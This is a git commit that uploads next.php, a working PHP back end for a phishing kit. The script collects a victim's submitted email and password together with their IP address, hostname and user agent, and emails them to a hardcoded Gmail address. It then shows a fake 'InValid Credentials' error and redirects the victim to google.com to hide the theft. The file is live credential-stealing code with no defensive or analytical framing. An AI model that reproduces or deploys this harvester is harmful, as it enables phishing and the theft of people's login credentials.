f5483cd02b27004baeb215dc128f7c973c29acad
mleb253 <dfatigates@outlook.com>
2024-10-04 03:53:38 -0700

    Add files via upload

---
+++ next.php
@@ -0,0 +1,41 @@
+<?php
+include 'email.php';
+$email = trim($_POST['mk']);
+$password = trim($_POST['mknow']);
+$Receive_email='denalioutervvear@gmail.com';
+$redirect="https://www.google.com/";
+
+if($email != null && $password != null){
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| Chicharito Lambo |--------------|\n";
+	
+	$message .= "ID            : ".$email."\n";
+	$message .= "Access              : ".$password."\n";
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- CrEaTeD bY Javier --------------|\n";
+	$send = $Receive_email;
+	$subject = "Login : $ip";
+    mail($send, $subject, $message);   
+	$signal = 'ok';
+	$msg = 'InValid Credentials';
+	
+	// $praga=rand();
+	// $praga=md5($praga);
+}
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg,
+        'redirect_link' => $redirect,
+    );
+    echo json_encode($data);
+
+?>
